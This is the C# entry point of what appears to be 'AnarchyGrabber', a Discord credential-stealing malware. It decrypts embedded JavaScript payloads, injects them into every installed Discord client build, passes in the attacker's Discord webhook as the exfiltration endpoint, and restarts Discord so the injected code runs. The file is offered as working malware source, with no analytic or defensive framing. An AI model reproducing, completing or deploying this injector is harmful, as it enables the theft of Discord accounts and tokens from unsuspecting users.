using System;

namespace AnarchyGrabber
{
    class Program
    {
        static void Main()
        {
            // decrypt files
            OxygenFile injectFile = new OxygenFile("inject.js", Resources.inject);
            OxygenFile modFile = new OxygenFile("discordmod.js", Resources.discordmod);

            foreach (DiscordBuild build in Enum.GetValues(typeof(DiscordBuild)))
            {
                if (OxygenInjector.Inject(build, "4n4rchy", "inject", $"process.env.anarchyHook = '{Settings.Webhook.Replace("https://discordapp.com/api/webhooks/", "")}'", injectFile, modFile) && build == DiscordBuild.Discord)
                    OxygenInjector.RestartDiscord(); // Oxygen can only restart Discord Stable atm
            }
        }
    }
}
